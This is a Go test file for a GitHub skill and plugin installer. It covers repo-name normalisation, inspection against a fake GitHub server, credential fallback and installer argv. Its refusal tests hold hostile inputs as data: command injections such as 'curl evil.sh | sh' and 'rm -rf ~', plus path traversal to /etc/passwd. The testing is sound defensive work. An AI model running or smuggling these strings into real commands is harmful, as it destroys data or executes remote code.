package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"terminal-lobby/skillscan"
)

// Installing from outside this box (docs/adr/0012). Three things are worth
// pinning: what the input field accepts, what one read-only look at a repo
// concludes about it, and the exact argv the installers are handed — because the
// installer runs as the caller and argv is the whole boundary between "a repo
// name" and "a command".

func TestNormalizeSourceAcceptsTheFormsAPersonPastes(t *testing.T) {
	for in, want := range map[string]string{
		"mattpocock/skills":                        "mattpocock/skills",
		"  mattpocock/skills  ":                    "mattpocock/skills",
		"https://github.com/mattpocock/skills":     "mattpocock/skills",
		"https://github.com/mattpocock/skills.git": "mattpocock/skills",
		"http://github.com/mattpocock/skills":      "mattpocock/skills",
		"github.com/mattpocock/skills":             "mattpocock/skills",
		"git@github.com:mattpocock/skills.git":     "mattpocock/skills",
		"vercel-labs/agent-skills":                 "vercel-labs/agent-skills",
		"a/b.c_d-e":                                "a/b.c_d-e",
	} {
		owner, repo, err := normalizeSource(in)
		if err != nil {
			t.Errorf("normalizeSource(%q): %v", in, err)
			continue
		}
		if got := owner + "/" + repo; got != want {
			t.Errorf("normalizeSource(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestNormalizeSourceRefusesAnythingElse(t *testing.T) {
	// The charset is the boundary: everything here would otherwise reach an
	// installer that runs as the caller.
	bad := []string{
		"", "   ", "owner", "owner/", "/repo", "owner/repo/extra",
		"../etc/passwd", "owner/../..", "owner/repo; rm -rf ~", "owner/repo`id`",
		"owner/repo$(id)", "owner/repo && curl evil.sh | sh", "owner repo",
		"owner/repo\nmore", "-flag/repo", "https://gitlab.com/owner/repo",
		"https://github.com/owner", "https://evil.com/github.com/o/r",
		strings.Repeat("a", 40) + "/repo", "owner/" + strings.Repeat("b", 101),
		"öwner/repo", "owner/repö",
	}
	for _, in := range bad {
		if owner, repo, err := normalizeSource(in); err == nil {
			t.Errorf("normalizeSource(%q) accepted as %q/%q — must be refused", in, owner, repo)
		}
	}
}

// fakeGitHub stands in for both api.github.com and raw.githubusercontent.com.
func fakeGitHub(t *testing.T, tree []string, files map[string]string, status int) *httptest.Server {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.Contains(r.URL.Path, "/git/trees/") {
			if status != 0 && status != 200 {
				if status == 403 {
					w.Header().Set("X-RateLimit-Remaining", "0")
				}
				w.WriteHeader(status)
				w.Write([]byte(`{"message":"nope"}`))
				return
			}
			entries := make([]map[string]any, 0, len(tree))
			for _, p := range tree {
				entries = append(entries, map[string]any{"path": p, "type": "blob"})
			}
			json.NewEncoder(w).Encode(map[string]any{"sha": "deadbeef", "tree": entries, "truncated": false})
			return
		}
		// a raw file fetch: /<owner>/<repo>/HEAD/<path>
		for name, body := range files {
			if strings.HasSuffix(r.URL.Path, name) {
				w.Write([]byte(body))
				return
			}
		}
		w.WriteHeader(http.StatusNotFound)
	}))
	old, oldRaw := githubAPI, githubRaw
	githubAPI, githubRaw = srv.URL, srv.URL
	t.Cleanup(func() {
		githubAPI, githubRaw = old, oldRaw
		srv.Close()
	})
	return srv
}

func TestInspectFindsTheSkillsInARepo(t *testing.T) {
	fakeGitHub(t, []string{
		"README.md",
		"skills/engineering/ask-matt/SKILL.md",
		"skills/engineering/tdd/SKILL.md",
		"skills/engineering/tdd/scripts/run.sh",
	}, map[string]string{
		"ask-matt/SKILL.md": "---\nname: ask-matt\ndescription: Ask which skill fits.\n---\nbody\n",
		"tdd/SKILL.md":      "---\nname: tdd\ndescription: |\n  Test first.\n  Red, green, refactor.\n---\n",
	}, 200)

	info, err := inspectSource(t.TempDir(), "mattpocock", "skills")
	if err != nil {
		t.Fatal(err)
	}
	if len(info.Skills) != 2 {
		t.Fatalf("found %d skills, want 2: %+v", len(info.Skills), info.Skills)
	}
	by := map[string]sourceSkill{}
	for _, s := range info.Skills {
		by[s.Name] = s
	}
	if by["ask-matt"].Description != "Ask which skill fits." {
		t.Errorf("description not read: %+v", by["ask-matt"])
	}
	// The folded block scalar most skills in this fleet use.
	if by["tdd"].Description != "Test first. Red, green, refactor." {
		t.Errorf("block description not folded: %q", by["tdd"].Description)
	}
	if by["tdd"].Path != "skills/engineering/tdd/SKILL.md" {
		t.Errorf("path = %q", by["tdd"].Path)
	}
	if info.Marketplace != "" || len(info.Plugins) != 0 {
		t.Errorf("no manifest in this repo, so no plugins: %+v", info)
	}
	if info.Ref != "deadbeef" {
		t.Errorf("want the resolved sha recorded for provenance, got %q", info.Ref)
	}
}

func TestInspectFindsAMarketplaceAndItsPlugins(t *testing.T) {
	fakeGitHub(t, []string{".claude-plugin/marketplace.json", "plugins/demo/.claude-plugin/plugin.json"},
		map[string]string{
			"marketplace.json": `{"name":"official","plugins":[
				{"name":"demo","description":"A demo plugin"},
				{"name":"other"}]}`,
		}, 200)

	info, err := inspectSource(t.TempDir(), "anthropics", "claude-plugins-official")
	if err != nil {
		t.Fatal(err)
	}
	if info.Marketplace != "official" {
		t.Errorf("marketplace = %q", info.Marketplace)
	}
	if len(info.Plugins) != 2 || info.Plugins[0].Name != "demo" ||
		info.Plugins[0].Description != "A demo plugin" {
		t.Errorf("plugins = %+v", info.Plugins)
	}
	if len(info.Skills) != 0 {
		t.Errorf("no SKILL.md in this repo: %+v", info.Skills)
	}
}

func TestInspectReportsARepoThatIsBoth(t *testing.T) {
	// mattpocock/skills really is both: 35 SKILL.md files AND a marketplace
	// manifest. Neither reading is wrong, so both are reported and the person
	// chooses (ADR-0012).
	fakeGitHub(t, []string{"skills/a/SKILL.md", ".claude-plugin/marketplace.json"},
		map[string]string{
			"a/SKILL.md":       "---\nname: a\ndescription: One.\n---\n",
			"marketplace.json": `{"name":"mattpocock-skills","plugins":[{"name":"mattpocock-skills"}]}`,
		}, 200)

	info, err := inspectSource(t.TempDir(), "mattpocock", "skills")
	if err != nil {
		t.Fatal(err)
	}
	if len(info.Skills) != 1 || info.Marketplace == "" {
		t.Fatalf("want both kinds offered: %+v", info)
	}
}

func TestInspectRefusesARepoThatIsNeither(t *testing.T) {
	fakeGitHub(t, []string{"README.md", "src/main.go"}, nil, 200)
	if _, err := inspectSource(t.TempDir(), "someone", "a-go-project"); err == nil {
		t.Fatal("want a refusal naming the reason")
	} else if !strings.Contains(err.Error(), "no skills") {
		t.Errorf("error should say what is missing, got %q", err)
	}
}

func TestInspectSeparatesAMissingRepoFromARateLimit(t *testing.T) {
	fakeGitHub(t, nil, nil, 404)
	_, err := inspectSource(t.TempDir(), "nobody", "nothing")
	if err == nil || !strings.Contains(err.Error(), "no such repository") {
		t.Errorf("404 should read as a missing repo, got %v", err)
	}

	fakeGitHub(t, nil, nil, 403)
	_, err = inspectSource(t.TempDir(), "someone", "something")
	if err == nil || !strings.Contains(err.Error(), "rate limit") {
		// A 403 with no remaining quota is the shared unauthenticated limit —
		// 60/hour per IP for everyone on this box — not a missing repo.
		t.Errorf("403 should read as the rate limit, got %v", err)
	}
}

func TestInspectUsesTheCallersOwnTokenWhenTheyHaveOne(t *testing.T) {
	var seen string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		seen = r.Header.Get("Authorization")
		json.NewEncoder(w).Encode(map[string]any{"sha": "x", "tree": []map[string]any{
			{"path": "skills/a/SKILL.md", "type": "blob"}}})
	}))
	defer srv.Close()
	oldAPI, oldRaw := githubAPI, githubRaw
	githubAPI, githubRaw = srv.URL, srv.URL
	defer func() { githubAPI, githubRaw = oldAPI, oldRaw }()

	home := t.TempDir()
	// The shape git writes: one line per host, credentials in the URL.
	if err := os.WriteFile(filepath.Join(home, ".git-credentials"),
		[]byte("https://viktor:tok3n@forgejo.example.com\nhttps://ViktorBarzin:ghp_secret@github.com\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := inspectSource(home, "o", "r"); err != nil {
		t.Fatal(err)
	}
	if seen != "Bearer ghp_secret" {
		t.Errorf("Authorization = %q, want the github.com token from ~/.git-credentials", seen)
	}
}

func TestInspectSendsNoTokenWhenThereIsNone(t *testing.T) {
	var seen string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		seen = "set:" + r.Header.Get("Authorization")
		json.NewEncoder(w).Encode(map[string]any{"sha": "x", "tree": []map[string]any{
			{"path": "SKILL.md", "type": "blob"}}})
	}))
	defer srv.Close()
	oldAPI, oldRaw := githubAPI, githubRaw
	githubAPI, githubRaw = srv.URL, srv.URL
	defer func() { githubAPI, githubRaw = oldAPI, oldRaw }()

	if _, err := inspectSource(t.TempDir(), "o", "r"); err != nil {
		t.Fatal(err)
	}
	if seen != "set:" {
		t.Errorf("want no Authorization header, got %q", seen)
	}
}

func TestInspectNamesARootLevelSkillAfterTheRepo(t *testing.T) {
	fakeGitHub(t, []string{"SKILL.md"},
		map[string]string{"SKILL.md": "---\nname: unslop\ndescription: Cut AI tells.\n---\n"}, 200)
	info, err := inspectSource(t.TempDir(), "michael-denyer", "pstack-claude")
	if err != nil {
		t.Fatal(err)
	}
	if len(info.Skills) != 1 || info.Skills[0].Name != "pstack-claude" {
		t.Fatalf("a repo whose root IS the skill takes the repo's name: %+v", info.Skills)
	}
}

func TestKnownOwnerIsANoteNotAGate(t *testing.T) {
	fakeGitHub(t, []string{"skills/a/SKILL.md"}, map[string]string{"a/SKILL.md": "---\nname: a\n---\n"}, 200)
	known, err := inspectSource(t.TempDir(), "vercel-labs", "skills")
	if err != nil {
		t.Fatal(err)
	}
	if !known.KnownOwner {
		t.Error("vercel-labs is one of the owners this box already runs")
	}
	unknown, err := inspectSource(t.TempDir(), "some-stranger", "skills")
	if err != nil {
		t.Fatalf("an unknown owner must still be inspectable, not refused: %v", err)
	}
	if unknown.KnownOwner {
		t.Error("some-stranger is not a known owner")
	}
}

// --- the argv the installers are handed --------------------------------------

// withStubInstaller replaces npx (and the claude CLI lookup) with a script that
// records its argv and its HOME, so the exact command line is assertable without
// installing anything.
func withStubInstaller(t *testing.T) (log string) {
	t.Helper()
	dir := t.TempDir()
	log = filepath.Join(dir, "argv")
	stub := filepath.Join(dir, "installer")
	script := "#!/bin/sh\nprintf 'HOME=%s ARGV=%s\\n' \"$HOME\" \"$*\" >> " + log + "\nexit 0\n"
	if err := os.WriteFile(stub, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	old := npxBinary
	npxBinary = stub
	t.Cleanup(func() { npxBinary = old })
	return log
}

func TestInstallingSkillsHandsTheCLIExactlyTheChosenNames(t *testing.T) {
	fakeGitHub(t, []string{"skills/a/SKILL.md", "skills/b/SKILL.md", "skills/c/SKILL.md"},
		map[string]string{}, 200)
	log := withStubInstaller(t)
	home := t.TempDir()

	out, err := installFromSource(home, "mattpocock", "skills", "skills", []string{"a", "c"})
	if err != nil {
		t.Fatalf("install: %v (%s)", err, out)
	}
	argv := readLog(t, log)
	want := "ARGV=-y skills@latest add mattpocock/skills -s a -s c -a claude-code -g -y"
	if !strings.Contains(argv, want) {
		t.Errorf("argv = %q\nwant it to contain %q", argv, want)
	}
	// HOME decides whose account the CLI writes to, and sudo -u does not reset it.
	if !strings.Contains(argv, "HOME="+home+" ") {
		t.Errorf("HOME not pinned to the caller: %q", argv)
	}
}

func TestInstallingRefusesANameTheRepoDoesNotOffer(t *testing.T) {
	// The client cannot widen what gets installed: every name is checked against
	// what the inspection actually found.
	fakeGitHub(t, []string{"skills/a/SKILL.md"}, nil, 200)
	log := withStubInstaller(t)
	_, err := installFromSource(t.TempDir(), "o", "r", "skills", []string{"a", "not-there"})
	if err == nil {
		t.Fatal("want a refusal for a name the repo does not offer")
	}
	if readLog(t, log) != "" {
		t.Errorf("nothing should have run: %q", readLog(t, log))
	}
}

func TestInstallingRefusesNonsenseBeforeRunningAnything(t *testing.T) {
	fakeGitHub(t, []string{"skills/a/SKILL.md"}, nil, 200)
	log := withStubInstaller(t)
	home := t.TempDir()
	for _, c := range []struct {
		kind  string
		names []string
	}{
		{"skills", nil},                       // nothing chosen
		{"plugins", []string{"a"}},            // repo has no marketplace
		{"nonsense", []string{"a"}},           // unknown kind
		{"skills", []string{"../etc/passwd"}}, // not a skill name
		{"skills", []string{"a; rm -rf ~"}},   // not a skill name
	} {
		if _, err := installFromSource(home, "o", "r", c.kind, c.names); err == nil {
			t.Errorf("installFromSource(%q, %v) must be refused", c.kind, c.names)
		}
	}
	if readLog(t, log) != "" {
		t.Errorf("no installer should have run: %q", readLog(t, log))
	}
}

func TestInstallingAPluginUsesTheManifestsOwnMarketplaceName(t *testing.T) {
	// The half after the @ comes from the manifest we just read, not from the
	// client — so a request cannot point `claude plugin install` at some other
	// marketplace.
	fakeGitHub(t, []string{".claude-plugin/marketplace.json"}, map[string]string{
		"marketplace.json": `{"name":"official","plugins":[{"name":"demo"}]}`,
	}, 200)
	dir := t.TempDir()
	log := filepath.Join(dir, "argv")
	stub := filepath.Join(dir, "claude")
	if err := os.WriteFile(stub, []byte("#!/bin/sh\nprintf '%s\\n' \"$*\" >> "+log+"\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	home := t.TempDir()
	if err := os.MkdirAll(filepath.Join(home, ".local", "bin"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Link(stub, filepath.Join(home, ".local", "bin", "claude")); err != nil {
		t.Skipf("cannot place a stub claude for this test: %v", err)
	}

	if _, err := installFromSource(home, "anthropics", "claude-plugins-official", "plugins", []string{"demo"}); err != nil {
		t.Fatal(err)
	}
	argv := readLog(t, log)
	if !strings.Contains(argv, "plugin marketplace add anthropics/claude-plugins-official") {
		t.Errorf("want the marketplace registered first: %q", argv)
	}
	if !strings.Contains(argv, "plugin install demo@official -y") {
		t.Errorf("want the manifest's own name after the @: %q", argv)
	}
}

func TestInspectSkipsAStaleCredentialAndKeepsGoing(t *testing.T) {
	// A real ~/.git-credentials holds several lines for one host and they are not
	// all live: wizard's FIRST github.com entry answers 401 while the two after it
	// work, which made every lookup fail until this fell through.
	var tried []string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		auth := r.Header.Get("Authorization")
		tried = append(tried, auth)
		if auth == "Bearer dead" {
			w.WriteHeader(http.StatusUnauthorized)
			w.Write([]byte(`{"message":"Bad credentials"}`))
			return
		}
		json.NewEncoder(w).Encode(map[string]any{"sha": "s", "tree": []map[string]any{
			{"path": "skills/a/SKILL.md", "type": "blob"}}})
	}))
	defer srv.Close()
	oldAPI, oldRaw := githubAPI, githubRaw
	githubAPI, githubRaw = srv.URL, srv.URL
	defer func() { githubAPI, githubRaw = oldAPI, oldRaw }()

	home := t.TempDir()
	if err := os.WriteFile(filepath.Join(home, ".git-credentials"),
		[]byte("https://git:dead@github.com\nhttps://ViktorBarzin:live@github.com\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	info, err := inspectSource(home, "o", "r")
	if err != nil {
		t.Fatalf("a stale first credential must not fail the lookup: %v", err)
	}
	if len(info.Skills) != 1 {
		t.Errorf("skills = %+v", info.Skills)
	}
	if len(tried) < 2 || tried[0] != "Bearer dead" || tried[1] != "Bearer live" {
		t.Errorf("want the dead credential tried then the live one, got %v", tried)
	}
}

func TestInspectFallsBackToNoCredentialAtAll(t *testing.T) {
	// Every credential stale: a public repo still reads unauthenticated, which is
	// the last candidate.
	var tried []string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		auth := r.Header.Get("Authorization")
		tried = append(tried, auth)
		if auth != "" {
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		json.NewEncoder(w).Encode(map[string]any{"sha": "s", "tree": []map[string]any{
			{"path": "SKILL.md", "type": "blob"}}})
	}))
	defer srv.Close()
	oldAPI, oldRaw := githubAPI, githubRaw
	githubAPI, githubRaw = srv.URL, srv.URL
	defer func() { githubAPI, githubRaw = oldAPI, oldRaw }()

	home := t.TempDir()
	if err := os.WriteFile(filepath.Join(home, ".git-credentials"),
		[]byte("https://a:dead1@github.com\nhttps://b:dead2@github.com\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := inspectSource(home, "o", "r"); err != nil {
		t.Fatalf("want the unauthenticated fallback to succeed: %v", err)
	}
	if tried[len(tried)-1] != "" {
		t.Errorf("last attempt should carry no credential, got %v", tried)
	}
}

func TestInspectSaysARepoIsTooLargeRatherThanFailingToParseIt(t *testing.T) {
	// torvalds/linux answers 200 with a tree far past the read cap. Parsing the
	// first 4 MB of that is not a partial answer, it is a syntax error — and
	// "unexpected end of JSON input" tells nobody anything.
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Write([]byte(`{"sha":"x","tree":[`))
		filler := strings.Repeat(`{"path":"a/very/long/path/that/goes/on/SKILL.md","type":"blob"},`, 80000)
		w.Write([]byte(filler))
	}))
	defer srv.Close()
	old := githubAPI
	githubAPI = srv.URL
	defer func() { githubAPI = old }()

	_, err := inspectSource(t.TempDir(), "torvalds", "linux")
	if err == nil || !strings.Contains(err.Error(), "too large to inspect") {
		t.Fatalf("want a size error, got %v", err)
	}
}

func TestInspectBoundsWhatItOffers(t *testing.T) {
	// A marketplace can be huge: the official one offers 286 plugins.
	tree := make([]string, 0, 260)
	for i := 0; i < 260; i++ {
		tree = append(tree, fmt.Sprintf("skills/s%03d/SKILL.md", i))
	}
	fakeGitHub(t, tree, nil, 200)
	info, err := inspectSource(t.TempDir(), "someone", "many")
	if err != nil {
		t.Fatal(err)
	}
	if len(info.Skills) != maxOffered || info.SkillsCut != 260-maxOffered {
		t.Fatalf("want %d offered and %d reported as cut, got %d and %d",
			maxOffered, 260-maxOffered, len(info.Skills), info.SkillsCut)
	}
}

func TestInstallingRecordsWhereItCameFrom(t *testing.T) {
	// ADR-0012 promises the row says where a skill came from rather than "own".
	// The installer is a stub here, so the test plants what it would have written
	// and checks the provenance around it.
	fakeGitHub(t, []string{"skills/handoff/SKILL.md"}, nil, 200)
	dir := t.TempDir()
	home := t.TempDir()
	stub := filepath.Join(dir, "installer")
	// Stand in for what `skills add` does: a real directory under ~/.claude/skills.
	script := "#!/bin/sh\nmkdir -p " + filepath.Join(skillscan.Root(home), "handoff") +
		"\nprintf '%s' '---\nname: handoff\n---\nbody\n' > " +
		filepath.Join(skillscan.Root(home), "handoff", "SKILL.md") + "\nexit 0\n"
	if err := os.WriteFile(stub, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	old := npxBinary
	npxBinary = stub
	defer func() { npxBinary = old }()

	if _, err := installFromSource(home, "mattpocock", "skills", "skills", []string{"handoff"}); err != nil {
		t.Fatal(err)
	}
	man, err := skillscan.LoadManifest(home)
	if err != nil {
		t.Fatal(err)
	}
	p, ok := man.Installed["handoff"]
	if !ok {
		t.Fatal("nothing recorded")
	}
	if p.From != "mattpocock/skills" {
		t.Errorf("From = %q, want the source repo", p.From)
	}
	if p.SourceHash == "" || p.InstalledAt == "" {
		t.Errorf("provenance incomplete: %+v", p)
	}
}
